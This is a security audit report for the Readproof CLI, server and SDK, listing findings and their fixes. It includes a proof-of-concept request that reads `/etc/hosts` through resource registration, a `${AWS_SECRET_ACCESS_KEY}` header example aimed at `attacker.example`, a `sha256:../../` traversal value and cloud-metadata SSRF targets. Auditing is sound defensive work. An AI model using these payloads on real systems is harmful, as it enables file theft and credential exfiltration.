# Security audit — August 2026

Pre-launch review of Readproof — `readproof` CLI, `readproofd` server,
TypeScript SDK, MCP server, DeepSeek Harness plugin, examples, CI and
release workflows. Started at `8b89484`; rebased onto `68cb08c` when `main`
advanced mid-audit. Fixes landed on the `security-audit` branch.

**The one-paragraph version.** The cryptographic core is sound and the
storage layer is fully parameterized. The API-key comparison is already
timing-safe. The two findings that matter are not bugs but a trust
boundary that is enforced nowhere and stated only obliquely: **anyone who
can register a resource can make `readproofd` read any file on its host
and disclose any environment variable it holds.** Both are inherent to
what a source adapter does, and both are acceptable *if and only if*
resource registration is an operator-trusted action — but `readproofd`
ships unauthenticated by default, and nothing in the docs says that
registering a resource is equivalent to shell access. One real
memory-safety-class bug was found and fixed (arbitrary file read via an
unvalidated content hash). Dependency scanning is clean.

> **Update — remediation on `security-hardening`.** Everything in the table
> below except RP-07 and RP-15 has since been fixed; the Status column is
> current, the prose that follows is the report as written and still describes
> each finding as it was found. RP-01, RP-02 and RP-04 were implemented along
> the lines the recommendations set out, and the trust boundary is now
> enforced rather than only documented: `readproofd` refuses filesystem
> sources, `${VAR}` header expansion and private network targets by default,
> each opened by one flag (`--filesystem-root`, `--header-env-allow`,
> `--allow-private-sources`). See "Remediation" at the end of this document,
> and [`SECURITY.md`](../SECURITY.md).

---

## Findings

Severity reflects impact *given the deployment the project documents*, not
worst-case impact in a deployment the project warns against.

| ID | Severity | Component | Finding | Status |
| --- | --- | --- | --- | --- |
| RP-01 | **High** | `source/filesystem`, `api` | A registered resource reads any file on the `readproofd` host — verified against `/etc/hosts`. No root restriction exists | **Fixed** |
| RP-02 | **High** | `source/http`, `api` | `${VAR}` header expansion discloses any environment variable of `readproofd` to an attacker-chosen URL | **Fixed** |
| RP-03 | **High** | `storage/blob`, `storage/s3blob` | Content hashes were not validated before path construction — arbitrary file read via `sha256:../../…`, plus a panic on short digests | **Fixed** |
| RP-04 | Medium | `source/http` | No SSRF address restriction: loopback, link-local and `169.254.169.254` are reachable, and redirects into them are followed | **Fixed** |
| RP-05 | Medium | `api` | Request bodies were read unbounded into memory on an unauthenticated-by-default server | **Fixed** |
| RP-06 | Medium | `source/http` | Response bodies were read unbounded, with no per-fetch timeout | **Fixed** |
| RP-07 | Medium | repo hygiene | 583 tracked files of vendored `node_modules/` and stale `dist/` under a pre-rename directory | Ignore rule added; removal open |
| RP-08 | Medium | DSH plugin | `readproof_evidence_export --with-content` bypasses the 1 MiB inline content cap | **Fixed** |
| RP-09 | Medium | `Dockerfile` | The `readproofd` container runs as root | **Fixed** |
| RP-10 | Low | `cmd/readproofd` | Only `ReadHeaderTimeout` was set; slow-read/slow-write peers pinned goroutines | **Fixed** |
| RP-11 | Low | `api` | 500 responses return raw internal error text, disclosing host paths and driver detail | **Fixed** |
| RP-12 | Low | `cmd/readproofd` | A startup failure can log the Postgres DSN, password included | **Fixed** |
| RP-13 | Low | `cmd/readproof`, `cmd/readproofd` | `--api-key` on argv is visible in process listings | **Fixed** |
| RP-14 | Low | `app`, `storage/blob` | Data dir `0755` and blobs `0644` are world-readable on a shared host | **Fixed** |
| RP-15 | Low | `api` | No rate limiting and no TLS termination | Open (documented) |
| RP-16 | Low | CI | `ci.yml` and `dsh-plugin.yml` declare no `permissions:` block | **Fixed** |
| RP-17 | Low | CI | Actions are pinned to mutable tags (`@v4`), not commit SHAs | **Fixed** |
| RP-18 | Low | DSH plugin | `package-lock.json` was missing for part of this audit | Resolved on `main` |
| RP-19 | Low | SDK | No fetch timeout, no response size limit, redirects followed silently | **Fixed** |
| RP-20 | Low | SDK | An unbounded raw response body is echoed into an error the model reads | **Fixed** |
| RP-21 | Low | `examples/support-agent` | A CLI ticket id reaches a filesystem path unvalidated | **Fixed** |
| RP-22 | Info | DSH plugin | The spawned `readproofd` inherits the full parent environment | **Fixed** |
| RP-23 | Info | docs | "tamper-evident" is used without the offline caveat `docs/evidence.md` states well | **Fixed** |
| RP-24 | Info | SDK | `endpoint` is not URL-validated | **Fixed** |
| RP-25 | Info | `Dockerfile` | `alpine:3.20` is behind the current stable base | **Fixed** |

---

## The two questions that decide the trust model

### RP-01 — Can a registered resource read arbitrary files on the host?

**Yes, any file the `readproofd` process can read, and the bytes come back
to the caller.** Verified end to end against a running server:

```
POST /v1/resources  {"uri":"readproof://pwn/etc/hosts",
                     "source":{"kind":"filesystem","filesystem":{"path":"/etc/hosts"}},
                     "policy":{"strategy":"require_fresh"}}
POST /v1/resolve    {"uri":"readproof://pwn/etc/hosts"}
→ 200, snapshot recorded, 213 bytes, provenance {"path":"/etc/hosts"}
```

`readproof get` then prints the file. `/etc/passwd`, `~/.aws/credentials`,
the SQLite database at `<data-dir>/readproof.db`, and a `.env` beside the
binary are all reachable the same way.

The path travels from the request body to `os.ReadFile` with no validation
at any layer:

- `internal/api/api.go:88` — `handleRegisterResource` parses only the
  `readproof://` URI; the source config is passed through untouched.
- `internal/wire/wire.go:82` — `SourceFromWire` copies `Path` verbatim.
- `internal/source/filesystem/filesystem.go:22` — `os.ReadFile(cfg.Path)`.

Absolute paths, `..`, and symlinks are all accepted. This is *by design*
for a local CLI reading the operator's own files; the problem is that the
same code is the network API's registration handler, `readproofd` is
unauthenticated unless `--api-key` is passed, and nothing tells an operator
that exposing the port is equivalent to granting file-read on the host.

**Recommendation (design-level — deliberately not implemented here).** Add
an allow-list root, enforced in the adapter rather than at registration, so
it also covers resources already in the database:

```go
type Fetcher struct {
    // Roots, when non-empty, restricts reads to files under one of these
    // directories. Empty preserves today's unrestricted behavior.
    Roots []string
}
```

Resolve the configured path with `filepath.EvalSymlinks`, then require
`filepath.Rel(root, resolved)` to not escape with `..` — evaluating
symlinks *before* the containment check is what stops a symlink inside an
allowed root from pointing out of it. Wire it from a
`--filesystem-root` flag / `READPROOFD_FILESYSTEM_ROOTS` env var, and make
`readproofd` (not the CLI) **default to refusing filesystem sources
entirely** unless a root is configured. That last part is the real fix:
the server has no legitimate reason to serve arbitrary host paths, and a
default-deny is the only version that protects an operator who never reads
this document. Until then, document registration as an operator-trusted,
shell-equivalent action.

### RP-02 — Can a resource definition exfiltrate `readproofd`'s environment?

**Yes.** `internal/source/http/http.go` expands any `${VAR}` matching
`[A-Za-z_][A-Za-z0-9_]*` in a header value, reading it from `readproofd`'s
own process environment at fetch time, and sends it to whatever URL the
same resource definition names. Because the attacker controls *both* the
variable name and the destination, this is a general environment-read
primitive: `Authorization: ${AWS_SECRET_ACCESS_KEY}` pointed at
`http://attacker.example/` works exactly as written. The repository's own
pre-existing tests demonstrate the mechanism with an arbitrary name
(`internal/source/http/http_test.go:145`).

Redaction does not help. `internal/redact/redact.go` masks the *stored
reference* in API responses and evidence bundles — it never sees the
resolved value, which is the thing being sent.

**Partly fixed.** `resolveHeaderValue` now refuses `READPROOFD_API_KEY`,
`READPROOF_API_KEY`, `READPROOFD_POSTGRES_DSN`, `READPROOFD_S3_ACCESS_KEY`
and `READPROOFD_S3_SECRET_KEY` outright, and honours an opt-in strict
allow-list in `READPROOF_HTTP_HEADER_ENV_ALLOWLIST`. Verified against a
live server:

```
{"error":"resolver: fetch source: http: header \"X-Steal\": header value
 references $READPROOFD_API_KEY, which is one of readproofd's own
 credentials and is never sent to a source"}
```

This closes the privilege-escalation path — reading the key that gates
registration, or the DSN and object-store keys behind it — but **the
general case remains open by default**: every other variable in the
server's environment (`AWS_*`, `GITHUB_TOKEN`, CI secrets, anything the
container inherits) is still readable unless the allow-list is set.

**Recommendation.** Make the allow-list the default for `readproofd` (an
empty allow-list meaning "no expansion at all"), keeping today's permissive
behavior only for the embedded CLI, where the environment already belongs
to the person typing the command. Document `READPROOF_HTTP_HEADER_ENV_ALLOWLIST`
in `.env.example` and `SECURITY.md`.

---

## Fixed in this branch

**RP-03 — arbitrary file read via an unvalidated content hash (High).**
`blob.LocalStore.path` joined a hash's digest onto the store root
(`internal/storage/blob/blob.go:38`), but `hexPart` only checked the
`sha256:` prefix. `Get("sha256:../../secret.txt")` escaped the blob root
and returned the file's bytes — confirmed by running the new test against
the previous code, which reported `traversing Get succeeded and returned
"top secret"`. A digest shorter than two characters additionally panicked
on the `hexHash[:2]` slice. `s3blob` shared the weak check. Both now route
through `ids.ParseContentHash`, which requires exactly 64 lowercase hex
characters. Regression test:
`internal/storage/blob/blob_test.go:TestLocalStoreRejectsMalformedContentHash`.

This is the one finding that is a straightforward bug rather than a policy
gap. Reachability depends on a content hash arriving from outside — stored
rows are trusted today — so it is defence in depth, but the primitive was
real.

**RP-05 — unbounded request bodies (Medium).** `decodeJSON` decoded
straight from `r.Body`. Now capped at 1 MiB via `http.MaxBytesReader` with
a 413, and trailing data after the JSON value is rejected rather than
ignored. Tests in `internal/api/body_limit_test.go`.

**RP-06 — unbounded response bodies and no fetch timeout (Medium).** The
HTTP adapter now enforces a 64 MiB cap (refusing, not truncating — a
truncated body would be hashed and stored as if complete), a 30 s
per-fetch timeout, and an http/https scheme allow-list.

**RP-10 — missing server timeouts (Low).** `ReadTimeout`, `WriteTimeout`
and `IdleTimeout` added alongside the existing `ReadHeaderTimeout`.

**RP-07 (partial) — ignore rules.** `node_modules/`, `*.bundle.json` and
`last-run.json` added to the root `.gitignore`.

---

## Open findings in detail

**RP-04 — SSRF (Medium).** No target-address restriction. A registered
resource can reach `http://169.254.169.254/latest/meta-data/…`,
`http://127.0.0.1:*`, and anything else routable from the server; Go's
client follows up to 10 redirects, so a public URL can redirect into a
private range. Go *does* strip `Authorization`, `Cookie` and
`WWW-Authenticate` on cross-domain redirects, so a `${VAR}` credential in
those headers is not forwarded to a redirect target — but a custom header
such as `X-Api-Key` **is**. A correct fix must check the address per-hop
(via `DialContext`, not before the request) so it survives both redirects
and DNS rebinding; a pre-flight `net.LookupIP` check is worse than none
because it invites TOCTOU. Scope this with RP-01 — the two share a
"registration is privileged" root cause.

**RP-08 — inline cap bypass (Medium).**
`integrations/deepseek-harness/dsh-plugin-readproof/src/tools.ts:461`
returns `buildEvidence(...)` directly. Every other content path caps bytes,
but `sdk/typescript/src/evidence.ts:324` embeds the full base64 of every
manifest entry with no cap, so the documented `maxInlineBytes` control does
not apply to `--with-content`. Cap the summed content, or refuse
`with_content` above the limit.

**RP-09 — container runs as root (Medium).** `Dockerfile` has no `USER`.
Add a non-root user and `USER` before `ENTRYPOINT`; the binary is static
(`CGO_ENABLED=0`) and needs no privileged port. Consider `gcr.io/distroless/static`
or at least a current Alpine (RP-25: `alpine:3.20` is behind stable).

**RP-11 — internal errors returned verbatim (Low).**
`internal/api/api.go:413` writes `err.Error()` for every status including
500, so a failed filesystem read returns the absolute host path and a
storage failure returns driver detail. Map 500s to a generic message and
log the detail server-side.

**RP-12 — DSN in startup logs (Low).** `cmd/readproofd/main.go:52`
`log.Fatalf("readproofd: %v", err)` wraps `open postgres backend: %w`; pgx
connection errors can include the DSN, which carries the password. Redact
the DSN before logging.

**RP-13 — API key on argv (Low).** Both binaries accept `--api-key`, which
is world-visible in `ps` on a shared host. The env var is the safe path and
already exists; say so in `docs/api.md` and prefer it in all examples.

**RP-14 — world-readable data (Low).** `internal/app/app.go:59` creates the
data dir `0755` and `internal/storage/blob/blob.go:58` writes blobs `0644`;
`cmd/readproof/evidence.go:57` writes bundles `0644`, and with
`--with-content` those carry the document bytes. Use `0700`/`0600` — this
store is meant to be the record of what an agent read, which is often
exactly the sensitive material.

**RP-15 — no rate limiting, no TLS (Low).** Neither exists. `readproofd`
speaks plaintext HTTP, so a bearer key crosses the network in the clear
unless something terminates TLS in front. Document a reverse proxy as the
supported deployment and add a per-IP limiter on the write endpoints.

**RP-16 / RP-17 — CI hardening (Low).** `ci.yml` and `dsh-plugin.yml`
declare no `permissions:`, inheriting the repository default, which can be
read/write. Add `permissions: {contents: read}` to both. All workflows pin
actions to mutable tags; pin to commit SHAs so a compromised tag cannot
alter a release build. `release.yml` (`contents: write`) and
`publish-npm.yml` (`id-token: write`, `contents: read`) are already
correctly scoped, and no workflow uses `pull_request_target`.

**RP-18 — DSH plugin lockfile (Low, resolved).** The audit started at
`8b89484`, where `dsh-plugin-readproof` had no committed
`package-lock.json`: `npm audit` failed with `ENOLOCK`, `npm ci` (what
`dsh-plugin.yml` runs) could not have succeeded, and an install resolved
the `@deepseek-ai/*` tree afresh every time. `68cb08c` on `main` restored
it mid-audit; this branch is rebased onto that commit and the suite passes
26/26 with a clean `npm audit --omit=dev`. No action needed — but adding
`npm audit --omit=dev` to the plugin's CI job is still worth doing, since
nothing currently fails the build if the lockfile goes missing again.

**RP-19 / RP-20 / RP-24 — SDK robustness (Low/Info).**
`sdk/typescript/src/client.ts:188` has no `signal`, so a hung `readproofd`
stalls the agent turn indefinitely; `client.ts:198` buffers the whole
response before any cap; redirects follow silently, so a compromised
endpoint can hand a *provenance* client another origin's JSON (the
`Authorization` header is **not** forwarded cross-origin — verified on Node
25 — so this is an integrity, not a credential, concern). `client.ts:203`
interpolates the entire raw body into an error that reaches the model.
Add `AbortSignal.timeout(...)`, `redirect: "error"`, a size cap, and
truncate the error text. `client.ts:79` should validate `endpoint` with
`new URL(...)`.

**RP-21 — example path handling (Low).**
`examples/support-agent/src/cli.ts:213` resolves `ticket-${ticket}.bundle.json`
from `argv` with only a non-empty check, and `cli.ts:217` creates
directories recursively — so a `../../` ticket id writes outside the
example. Self-inflicted, but `session-runs.ts:161` already shows the right
pattern (`replace(/[^A-Za-z0-9._-]/g,'-')`); apply it in `requireTicket`.

**RP-22 — child process inherits the full environment (Info).**
`integrations/deepseek-harness/dsh-plugin-readproof/src/spawn.ts:26` passes
no `env`, so the spawned `readproofd` receives every parent variable. This
directly contradicts the sibling MCP overlay, which documents the opposite
at `readproof-mcp.cordis.yml:13-16` ("scrubs ambient variables whose names
look like credentials"). Pass an explicit allow-listed `env`. Note this
compounds RP-02: the more the child inherits, the more `${VAR}` can reach.

**RP-23 — wording (Info).** `docs/evidence.md:210-247` is exemplary and
states plainly that an offline verify proves "anything at all, offline,
about a re-rooted forgery" — nothing. But `cmd/readproof/evidence.go:16`
and `internal/evidence/bundle.go:1` say "tamper-evident" unqualified, and
an unsigned bundle verified with `--offline` is *not* tamper-evident: the
forger recomputes the root. Say "integrity-checked" there, or "tamper-evident
against the store (unsigned)". The README's Security section and the site
are otherwise accurate and appropriately hedged — "not yet: SSRF
allow-list, signed bundles" is honest, and should now also name RP-01.

---

## Checklist

**1. Secrets and history — no finding.** `.env` has never been committed
(`git log --all -- .env` is empty) and is ignored. A pattern scan across
all 103 commits found only the literal placeholder `ghp_…` in
documentation. No `.npmrc`, `.netrc`, key or PEM file is tracked. The
owner's local npm token is **not** in any commit, workflow, or site file;
`publish-npm.yml` passes it as `NODE_AUTH_TOKEN` from a secret, uses
`set -euo pipefail` with no `set -x`, and never echoes it. Compose and
`.env.example` credentials are clearly labelled dev-only placeholders.
`examples/support-agent/data`, `*.bundle.json` and `last-run.json` are
ignored by the subproject; `*.bundle.json` is now ignored at the root too.

**2. HTTP source adapter** — see RP-02, RP-04, RP-06. Scheme allow-list,
size cap and timeout now enforced; `file://` was already refused by Go's
transport and is now refused explicitly. Redaction is complete for stored
header *references* in API responses, `inspect`, and evidence bundles —
but by construction cannot cover resolved values.

**3. Filesystem source adapter** — see RP-01. No allow-list root exists;
one is recommended above with a concrete design. Registration is currently
operator-trusted **in fact but not in documentation**.

**4. GitHub adapter — no finding of substance.** `BaseURL` defaults to
`https://api.github.com` and is only overridden in tests
(`internal/source/github/github.go:24`). The token is read from
`GITHUB_TOKEN` at fetch time and never stored. `Owner`, `Repo` and `Path`
are interpolated into the URL unescaped
(`internal/source/github/github.go:46`), so a crafted path could reach a
different GitHub API endpoint (`../../`) — but only within
`api.github.com`, under the caller's own token, and the caller already
chooses the whole resource definition, so there is no privilege gained.
Worth `url.PathEscape` for tidiness. It shares RP-06's missing size cap.

**5. HTTP API** — auth uses `crypto/subtle.ConstantTimeCompare`
(`internal/api/api.go:79`) — **no timing finding**. `/healthz`
unauthenticated is correct. Body limits and JSON strictness fixed (RP-05).
Error leakage RP-11, no rate limiting or TLS RP-15, `--api-key` on argv
RP-13. **No CORS middleware exists**, which is the safe default — browsers
cannot read cross-origin responses. Run ids, URIs and tag names are never
concatenated into SQL. Tag names are validated by a single shared
`tag.ValidateName` (`internal/tag/tag.go:43`) excluding `@` and `/`; URIs
go through one `resource.SplitRef` entry point. Run ids are **not**
validated, but they are only ever bound parameters and map keys, so this
is a data-quality rather than a security gap.

**6. Storage — no injection finding.** All 69 query sites in both backends
use `?`/`$N` placeholders; a scan for format-string SQL found nothing.
Migrations are embedded, applied in a transaction, and version-tracked.
Blob path construction is RP-03 (fixed). S3 credentials are passed to
`credentials.NewStaticV4` and never logged. File permissions are RP-14.

**7. MCP server and DSH plugin — one notable positive.** The MCP server
exposes 13 tools and **deliberately does not expose resource
registration** (`internal/mcp/tools.go`) — so a prompt-injected model
cannot register a filesystem source at `/etc/passwd`. That is the single
most important design decision on this surface and it is the right one.
The `readproof://{namespace}/{+path}` template cannot smuggle traversal:
`{+path}` is opaque to the resolver, which looks the URI up as a database
key, and `@` is handled by the one `SplitRef` parser
(`internal/resource/resource.go:55`). The 1 MiB cap is enforced in
`internal/mcp/content.go:114` as a byte cap, truncating on a rune boundary
and labelling the result — except for RP-08 in the plugin. `spawn` uses the
argv array form with no `shell: true` anywhere in the repository and does
**not** pass the API key on argv — **no command-injection finding**; env
inheritance is RP-22. Errors use `err.message` only, leaking no env or
stack traces.

**8. Evidence and Merkle — no finding.** `evidence verify` never dereferences
a URL from the bundle; `--server` comes only from the flag or env, so a
bundle cannot redirect verification. `docs/evidence.md:243-247` explicitly
documents that a re-rooted forgery passes `--offline`, which is exactly
right. The duplicate-last-node rule admits CVE-2012-2459-shaped collisions
and `internal/merkle/merkle.go:58-62` both says so and explains why the
full entry list makes it moot. Leaves are unambiguously separated
(length-prefixed position, `0x00` delimiters). Bundle decoding tolerates
unknown fields deliberately and inherits Go's nesting limit; input is a
local file the operator names. Wording nit is RP-23.

**9. SDK, plugin, examples — no injection finding.** The SDK fetches only
its configured `endpoint`, sends the token in a header only, has no `eval`
or dynamic import, interpolates no user data into URL *paths*, and wraps
every query value in `encodeURIComponent`. Robustness gaps are RP-19/20/24.
No package reads a `.env` file — all four use `process.env` only. No
`child_process` in the support-agent; `scenario.sh` quotes every expansion.
Path handling is RP-21.

**10. Supply chain and CI** — RP-16/17/18 above. `pull_request_target` is
**absent** — good. `release.yml` uses `GITHUB_TOKEN` only for the release
and a separate PAT for the tap. `publish-npm.yml` publishes with
`--provenance` under `id-token: write`, guards on the secret being present,
uses `set -euo pipefail` with no `set -x`, and never echoes the token —
**no secret-exposure finding**. `go.sum` is present and lockfiles now exist
for the SDK, both examples, and the plugin. Dockerfile is RP-09/RP-25.

**11. Docs and claims — largely accurate.** `docs/evidence.md` is a model
of honest scoping. README and site correctly say bundles are unsigned and
that an SSRF allow-list is not yet implemented. Two gaps: "tamper-evident"
unqualified in the CLI help and package doc (RP-23), and — more
importantly — **nothing anywhere states that registering a resource is
equivalent to file-read on the `readproofd` host** (RP-01). `docs/api.md`
documents auth but offers no trust-model, TLS, or reverse-proxy guidance.

---

## Commands run

```
$ govulncheck ./...
Your code is affected by 0 vulnerabilities.
This scan also found 0 vulnerabilities in packages you import and 1
vulnerability in modules you require, but your code doesn't appear to call
these vulnerabilities.

$ govulncheck -show verbose ./...      # identifying the one required-module finding
Vulnerability #1: GO-2026-5932
  golang.org/x/crypto/openpgp is unmaintained, unsafe by design
  Module: golang.org/x/crypto  Found in: golang.org/x/crypto@v0.55.0  Fixed in: N/A
```

`GO-2026-5932` is not called by any package this module builds, matching
what `SECURITY.md` already records. Accepted.

```
$ npm audit --omit=dev
sdk/typescript                  found 0 vulnerabilities   (prod 1, dev 3 — zero runtime deps)
examples/support-agent          found 0 vulnerabilities   (prod 5, dev 3)
examples/langgraph-ts           found 0 vulnerabilities   (prod 23, dev 3, peer 2)
dsh-plugin-readproof            found 0 vulnerabilities   (23 packages, after 68cb08c)
```

**No non-dev advisories anywhere.** The plugin figure is from a clean
`npm ci` against the lockfile restored in `68cb08c`; before that commit the
audit could not run at all (RP-18).

Test suites re-run after the fixes, on this branch:

```
$ node --test dist/test/*.test.js       # sdk/typescript      20/20 pass
$ npm ci && npm test                    # dsh-plugin-readproof 26/26 pass
```

The plugin suite matters most here: its `spawn` tests build and drive a
real `readproofd` from this branch's source, so they exercise the request
cap, the new server timeouts, and the HTTP adapter changes end to end.

```
$ git log --all -- .env                        # empty — never committed
$ git log --all --diff-filter=A --name-only    # only .env.example matches /env|secret|token|key/
$ git log --all -p | grep -aE '(ghp_|npm_…|sk-…|AKIA…|BEGIN … PRIVATE KEY|xox[bp]-)'
  → 4 hits, all the literal placeholder "ghp_…" in documentation
$ git ls-files | grep -c node_modules           # 535  (RP-07)
```

Verification after every fix:

```
$ go build ./... && go vet ./... && gofmt -l . && go test ./...   # all green
```

---

## Recommended order before launch

1. **RP-01** — default-deny filesystem sources in `readproofd`, or
   document registration as shell-equivalent. This is the launch blocker.
2. **RP-02** — make the env allow-list the default for `readproofd`.
3. **RP-07** — `git rm -r --cached integrations/deepseek-harness/dsh-plugin-ctx`
   and delete the directory; it is 583 tracked files of build output and
   vendored dependencies with no source, superseded by `dsh-plugin-readproof`.
4. **RP-09, RP-16, RP-17** — non-root container, `permissions:` blocks,
   SHA-pinned actions. All small.
5. **RP-04** — SSRF allow-list, per-hop, scoped with RP-01.

---

## Remediation

Landed on `security-hardening`, one commit per finding, each with tests.

**The trust boundary is now enforced, not just described.** A resource
definition names a file to read, an address to connect to, and environment
variables to send; on `readproofd` all three default to deny.

| Control | Default on `readproofd` | Opt in | Embedded CLI |
| --- | --- | --- | --- |
| Filesystem sources (RP-01) | refused | `--filesystem-root <dir>`, `READPROOFD_FILESYSTEM_ROOTS` | unrestricted, deliberately |
| `${VAR}` header expansion (RP-02) | nothing expands | `--header-env-allow NAME`, `READPROOFD_HEADER_ENV_ALLOWLIST` | permissive; deny-list still applies |
| Private network targets (RP-04) | refused | `--allow-private-sources`, `READPROOFD_ALLOW_PRIVATE_SOURCES=1` | allowed (localhost development) |

Enforcement lives in the source adapters
(`internal/source/filesystem`, `internal/source/http`) through a new
`source.Validator` hook, so a row registered under a wider policy is refused
at fetch as well as at registration; `source.DeniedError` maps a policy
refusal to a 400 carrying the flag that would allow it, rather than to a
generic 500. Filesystem containment resolves symlinks — including through a
path's deepest existing ancestor — before comparing against a root. The SSRF
check runs in the dialer's `Control` hook, on the address the resolver
returned, so it survives DNS rebinding, and again per redirect hop with the
chain capped at 5.

Also fixed: the plugin's `--with-content` inline cap (RP-08, refused rather
than truncated — a cut bundle no longer matches its own Merkle root), non-root
container on Alpine 3.24 (RP-09/RP-25), generic 500s with a logged request id
(RP-11), DSN scrubbing in startup logs (RP-12), an argv-API-key warning
(RP-13), `0700`/`0600` on the store (RP-14), `permissions: contents: read` and
SHA-pinned actions across all five workflows (RP-16/RP-17), SDK timeout /
response cap / endpoint validation / error truncation (RP-19/RP-20/RP-24), a
validated ticket id in the support-agent example (RP-21), a minimal child
environment for the spawned `readproofd` (RP-22), and "integrity-checked"
wording wherever "tamper-evident" stood unqualified (RP-23).

**Still open.** RP-07 (removing the tracked `dsh-plugin-ctx` tree — repository
hygiene, no behaviour) and RP-15 (no in-process TLS or rate limiting, now
documented as a reverse-proxy deployment in `docs/api.md`).
